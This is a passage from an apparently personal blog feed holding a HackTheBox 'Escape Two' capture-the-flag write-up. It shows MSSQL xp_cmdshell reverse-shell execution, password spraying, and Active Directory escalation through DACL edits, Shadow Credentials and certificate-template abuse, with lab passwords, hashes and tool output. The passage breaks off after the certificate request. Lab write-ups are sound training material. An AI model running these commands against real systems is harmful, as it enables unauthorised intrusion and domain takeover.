&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item><item><title>HTB Escape Two - Writeup</title><link>https://solarspectre.github.io/p/htb-escape-two-writeup/</link><pubDate>Mon, 17 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-escape-two-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/cover.png" alt="Featured image of post HTB Escape Two - Writeup" />&lt;h3 id="enumeration">Enumeration
&lt;/h3>&lt;p>Let&amp;rsquo;s start with a scan to all ports:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p- --open --min-rate &lt;span class="m">5000&lt;/span> -vvv -n -Pn 10.10.11.51 -oG allPorts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/1.png"
width="408"
height="503"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_40439663a3a11e59.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_5c031bd46bfe2bbb.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="81"
data-flex-basis="194px"
>&lt;/p>
&lt;p>once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl"> sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/2.png"
width="486"
height="554"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_4ea4b4a3e291b08b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_cb1c65a6350e6cd.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="87"
data-flex-basis="210px"
>&lt;/p>
&lt;p>Add the domains from the scan to your /etc/hosts file&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">10.10.11.51 DC01.sequel.htb sequel.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Well, taking a look at smb with smbclient using the credentials that HackTheBox gives us we can see the share names for this domain&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.11.51 -U &lt;span class="s1">&amp;#39;rose&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/3.png"
width="432"
height="196"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_fb652cce378ffe33.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_3c7baf155f4c4d54.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="528px"
>&lt;/p>
&lt;p>There&amp;rsquo;s a share called Accounting Department, list the contents of it&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">smbclient //10.10.11.51/Accounting&lt;span class="se">\ &lt;/span>Department -U &lt;span class="s1">&amp;#39;rose&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>we can download the files hosted there&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">get accounts.xlsx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">get accounting_2024.xlsx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/4.png"
width="604"
height="192"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_debf88636f03901.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_8b551d991e9b4e39.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="314"
data-flex-basis="755px"
>&lt;/p>
&lt;p>You can see the contents of the accounts.xlsx file with &lt;a class="link" href="https://jumpshare.com/viewer/xlsx" target="_blank" rel="noopener"
>https://jumpshare.com/viewer/xlsx&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/6.png"
width="541"
height="183"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_1983a143c9144cbd.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_5764122f881f44ff.png 1024w"
loading="lazy"
alt="Image 6"
class="gallery-image"
data-flex-grow="295"
data-flex-basis="709px"
>&lt;/p>
&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">netexec mssql 10.10.11.51 -u sa -p &amp;lt;password&amp;gt; --local-auth -M mssql_priv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now we&amp;rsquo;ve found another user (sa) to continue enumerating&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/8.png"
width="1001"
height="91"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_ea62eba353ee58c7.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_36fb689d16eb2ec7.png 1024w"
loading="lazy"
alt="Image 8"
class="gallery-image"
data-flex-grow="1100"
data-flex-basis="2640px"
>&lt;/p>
&lt;p>It&amp;rsquo;s a sysadmin, so we can get a reverse shell with xp_cmdshell in mssql, login to it using impacket mssqlclient&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">mssqlclient.py sa@10.10.11.51
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Enable xp_cmdshell with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sp_configure &amp;#39;show advanced options&amp;#39;, 1;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RECONFIGURE;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RECONFIGURE;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now execute the powershell reverse shell encoded in base64 with this, you can use &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
>https://www.revshells.com/&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">EXEC xp_cmdshell &amp;#39;powershell -e [base64ReverseShell]&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/9.png"
width="265"
height="70"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_d6da6f4e2812ee64.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_c26ef41205a3e6ff.png 1024w"
loading="lazy"
alt="Reverse Shell"
class="gallery-image"
data-flex-grow="378"
data-flex-basis="908px"
>&lt;/p>
&lt;p>Let&amp;rsquo;s start enumerating this machine, we can see a SQL2019 folder&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/10.png"
width="557"
height="414"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_ae8de43dd281978b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_b03f13de89061c22.png 1024w"
loading="lazy"
alt="Contents of C folder"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>there&amp;rsquo;s a file with credentials in ExpressAdv_ENU&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">cat sql-Configuration.INI
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Create a list with all the users and passwords you&amp;rsquo;ve found to do a password spraying attack and find any reused passwords&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">netexec smb 10.10.11.51 -u users.txt -p passwords.txt --continue-on-success
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/11.png"
width="602"
height="38"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_444b58356db2cdbf.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_7657876816ab8ecb.png 1024w"
loading="lazy"
alt="Reused password"
class="gallery-image"
data-flex-grow="1584"
data-flex-basis="3802px"
>&lt;/p>
&lt;p>ryan and sql_svc have the same password, so we can login to ryan using evilwinrm&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.51 -u ryan -p &amp;lt;password&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now you can get the user flag
&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/12.png"
width="468"
height="222"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_896a3dc3a5e9cf73.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_e277f2b2225ef23f.png 1024w"
loading="lazy"
alt="User Flag"
class="gallery-image"
data-flex-grow="210"
data-flex-basis="505px"
>&lt;/p>
&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Using Bloodhound community edition we can find a path to Administrator using the credentials of ryan&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/19.png"
width="1379"
height="751"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_4b34a6184971a1ef.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_802a634224f4fbf6.png 1024w"
loading="lazy"
alt="Write Owner"
class="gallery-image"
data-flex-grow="183"
data-flex-basis="440px"
>&lt;/p>
&lt;p>Set the owner of the ca_svc account to ryan&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Current owner information below
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - SID: S-1-5-21-548670397-972687484-3496335370-512
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - sAMAccountName: Domain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>Domain Admins,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>sequel,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OwnerSid modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Grant Full Control Rights to ryan using DACL (Discretionary Access Control List) to escalate privileges&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL backed up to dacledit-20250330-161623.bak
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Shadow Credentials attack&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad shadow auto -u &lt;span class="s1">&amp;#39;ryan@sequel.htb&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;WqSZAF6CysDQbGb3&amp;#39;&lt;/span> -account ca_svc -dc-ip 10.10.11.51
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Targeting user &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate generated
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating Key Credential
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Key Credential generated with DeviceID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Adding Key Credential with device ID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span> to the Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully added Key Credential with device ID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span> to the Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Authenticating as &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span> with the certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using principal: ca_svc@sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get TGT...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved credential cache to &lt;span class="s1">&amp;#39;ca_svc.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to retrieve NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Restoring the old Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully restored the old Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>: 3b181b914e7a9d5508ea1e20bc2b7fce
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Find a vulnerable template with the hash of the ca_svc account&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad find -u &lt;span class="s1">&amp;#39;ca_svc@sequel.htb&amp;#39;&lt;/span> -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/16.png"
width="776"
height="228"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_62a59755f8145c85.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_7f7d482470429c27.png 1024w"
loading="lazy"
alt="Vulnerable Cert"
class="gallery-image"
data-flex-grow="340"
data-flex-basis="816px"
>&lt;/p>
&lt;p>Now upload the certificate template&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$PWD&lt;/span>/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/17.png"
width="496"
height="73"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_f8228be16f78db04.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_bca956267eec87d1.png 1024w"
loading="lazy"
alt="Cert Uploaded"
class="gallery-image"
data-flex-grow="679"
data-flex-basis="1630px"
>&lt;/p>
&lt;p>Get the Admin Cert&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad req -u ca_svc -hashes &lt;span class="s1">&amp;#39;3b181b914e7a9d5508ea1e20bc2b7fce&amp;#39;&lt;/span> -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to resolve &lt;span class="s1">&amp;#39;sequel.htb&amp;#39;&lt;/span> at &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Generating RSA key
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting certificate via RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to connect to endpoint: ncacn_np:10.10.11.51&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Connected to endpoint: ncacn_np:10.10.11.51&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully requested certificate
